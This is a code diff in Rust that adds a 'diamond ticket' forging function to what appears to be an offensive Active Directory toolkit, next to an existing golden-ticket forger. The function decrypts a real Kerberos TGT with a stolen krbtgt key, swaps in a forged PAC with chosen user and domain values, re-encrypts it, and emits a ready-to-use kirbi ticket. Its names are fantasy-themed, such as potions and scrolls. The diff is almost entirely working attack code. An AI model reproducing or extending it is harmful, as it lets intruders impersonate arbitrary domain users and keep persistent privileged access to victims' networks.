@@ -52,6 +52,96 @@ impl Default for TicketBlueprint {
     }
 }
 
+/// Diamond ticket: request a real TGT, decrypt it with the krbtgt key,
+/// replace the PAC with a forged one, and re-encrypt.
+pub fn forge_diamond(
+    real_tgt_kirbi: &[u8],
+    krbtgt_key: &[u8],
+    krbtgt_etype: i32,
+    bp: &TicketBlueprint,
+) -> Result<ForgedTicket> {
+    use crate::dungeon::request_magic::parse_kirbi_tgt_pub;
+
+    let (scroll, orig_session_key, orig_cname) = parse_kirbi_tgt_pub(real_tgt_kirbi)?;
+
+    let plaintext = potions::disenchant(
+        krbtgt_etype, krbtgt_key, KU_TICKET, &scroll.enc_part.cipher,
+    )?;
+
+    let vault = ScrollVault::decode(&plaintext)?;
+
+    // Preserve fields from the real ticket
+    let saved_session_key = vault.session_key.clone();
+    let saved_crealm      = vault.crealm.clone();
+    let saved_cname       = vault.cname.clone();
+    let saved_flags       = vault.flags;
+    let saved_auth_time   = vault.auth_time.clone();
+    let saved_start_time  = vault.start_time.clone();
+    let saved_end_time    = vault.end_time.clone();
+    let saved_renew_till  = vault.renew_till.clone();
+
+    // Build effective blueprint using real ticket values where bp fields are empty
+    let effective_bp = TicketBlueprint {
+        username: if bp.username.is_empty() {
+            saved_cname.parts.first().cloned().unwrap_or_default()
+        } else { bp.username.clone() },
+        domain: if bp.domain.is_empty() { saved_crealm.clone() } else { bp.domain.clone() },
+        service_key: krbtgt_key.to_vec(),
+        service_etype: krbtgt_etype,
+        ..bp.clone()
+    };
+
+    let new_pac = build_pac(&effective_bp, &saved_session_key, true)?;
+    let ad_inner = encode_sequence(&[
+        encode_integer(AD_WIN2K_PAC as i64).as_slice(),
+        &encode_octet_string(&new_pac),
+    ].concat());
+    let new_auth_data = encode_sequence(&encode_sequence(&ad_inner));
+
+    let new_vault = ScrollVault {
+        flags:       saved_flags,
+        session_key: saved_session_key.clone(),
+        crealm:      saved_crealm.clone(),
+        cname:       saved_cname.clone(),
+        transited:   Vec::new(),
+        auth_time:   saved_auth_time.clone(),
+        start_time:  saved_start_time.clone(),
+        end_time:    saved_end_time.clone(),
+        renew_till:  saved_renew_till,
+        caddr:       None,
+        auth_data:   Some(new_auth_data),
+    };
+
+    let enc_bytes = new_vault.encode();
+    let new_cipher = potions::enchant(krbtgt_etype, krbtgt_key, KU_TICKET, &enc_bytes)?;
+    let new_enc_part = SealedChamber::with_kvno(krbtgt_etype, scroll.enc_part.kvno.unwrap_or(2), new_cipher);
+
+    let diamond_ticket = Scroll {
+        tkt_vno: scroll.tkt_vno,
+        realm:   scroll.realm.clone(),
+        sname:   scroll.sname.clone(),
+        enc_part: new_enc_part,
+    };
+
+    let cred_info = KrbCredInfo {
+        key:        saved_session_key,
+        prealm:     Some(saved_crealm),
+        pname:      Some(saved_cname),
+        flags:      Some(saved_flags),
+        auth_time:  Some(saved_auth_time),
+        start_time: saved_start_time,
+        end_time:   Some(saved_end_time),
+        renew_till: None,
+        srealm:     Some(scroll.realm.clone()),
+        sname:      Some(scroll.sname.clone()),
+    };
+    let kirbi = build_kirbi(&diamond_ticket, cred_info);
+    let b64 = wand_utils::kirbi_to_b64(&kirbi);
+    let _ = orig_cname;
+    let _ = orig_session_key;
+    Ok(ForgedTicket { kirbi, b64 })
+}
+
 pub fn forge_golden(bp: &TicketBlueprint) -> Result<ForgedTicket> {
     if bp.service_key.is_empty() { bail!("krbtgt key required for golden ticket"); }
     let sname = bp.sname.clone().unwrap_or_else(|| Glyph::new_krbtgt(&bp.domain));
